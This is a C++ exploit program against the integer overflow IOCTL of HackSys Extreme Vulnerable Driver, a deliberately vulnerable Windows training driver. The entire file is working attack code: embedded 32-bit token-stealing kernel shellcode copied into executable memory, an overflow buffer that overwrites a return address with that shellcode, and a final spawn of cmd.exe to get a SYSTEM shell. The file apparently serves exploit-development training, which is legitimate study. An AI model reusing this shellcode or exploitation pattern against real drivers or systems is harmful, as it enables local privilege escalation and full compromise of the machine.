#include <iostream>
#include <windows.h>
#include <psapi.h>

// QWORD is nicer!
typedef uint64_t QWORD;
typedef QWORD* PQWORD;

// 
// https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/d4drvif/nf-d4drvif-ctl_code
#define HACKSYS_EVD_IOCTL_INTEGER_OVERFLOW                CTL_CODE(FILE_DEVICE_UNKNOWN, 0x809, METHOD_NEITHER, FILE_ANY_ACCESS)

#define HEVD_SYM_LINK "\\\\.\\HacksysExtremeVulnerableDriver"

int main()
{
    // get a handle to the driver using the Symbolic link
    HANDLE hDevice = CreateFileA(HEVD_SYM_LINK, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL | FILE_FLAG_OVERLAPPED, NULL);

    printf("[+] HEVD Integer Overflow\n");
    printf("[+] ---------------------\n\n");

    // if CreateFileA fails the handle will be -0x1
    if (hDevice == (HANDLE)-0x1)
    {
        printf("[+] Driver handle: 0x%p\n", hDevice);
        printf("[!] Unable to get a handle to the driver.\n");
        return 1;
    }
    else
    {
        printf("[+] Driver handle: 0x%p\n", hDevice);

        // token stealing shellcode - 32bit
        const unsigned char shellcode[] = { 
            0x60, 0x31, 0xC0, 0x64, 0x8B, 0x80, 0x24, 0x01, 
            0x00, 0x00, 0x8B, 0x40, 0x50, 0x89, 0xC1, 0xBA, 
            0x04, 0x00, 0x00, 0x00, 0x8B, 0x80, 0xB8, 0x00, 
            0x00, 0x00, 0x2D, 0xB8, 0x00, 0x00, 0x00, 0x39, 
            0x90, 0xB4, 0x00, 0x00, 0x00, 0x75, 0xED, 0x8B, 
            0x90, 0xF8, 0x00, 0x00, 0x00, 0x89, 0x91, 0xF8, 
            0x00, 0x00, 0x00, 0x61, 0x31, 0xC0, 0x5D, 0xC2,
            0x08, 0x00 };

        // allocate memory for the shellcode
        LPVOID allocShellcode = VirtualAlloc(NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        if (!allocShellcode)
        {
            printf("[!] Unable to allocate memory for the shellcode. Error code: %d\n", GetLastError());
            return 1;
        }

        printf("[+] Memory allocated for shellcode: 0x%p\n", allocShellcode);

        // copy the shellcode in to the memory
        RtlMoveMemory(allocShellcode, shellcode, sizeof(shellcode));
        printf("[+] Shellcode copied to: 0x%p\n", allocShellcode);

        printf("[!] Press enter when ready...");
        getchar();

        // the buffer, fill with As
        char buffer[0x82c];
        char term[] = "\xb0\xb0\xd0\xba";

        memset(buffer, 0x41, 0x824);
        memcpy(buffer + 0x824, &allocShellcode, 0x4);
        memcpy(buffer + 0x828, &term, 0x4);

        DWORD lpBytesReturned = 0;
        BOOL result = DeviceIoControl(hDevice, HACKSYS_EVD_IOCTL_INTEGER_OVERFLOW, buffer, 0xffffffff, NULL, 0, &lpBytesReturned, NULL);

        printf("[+] Hopefully the magic has happened...\n");
        printf("[+] Spawning new process..\n\n");


        // spawn a new command prompt
        system("cmd.exe");

        // close the driver handle
        CloseHandle(hDevice);
    }
}
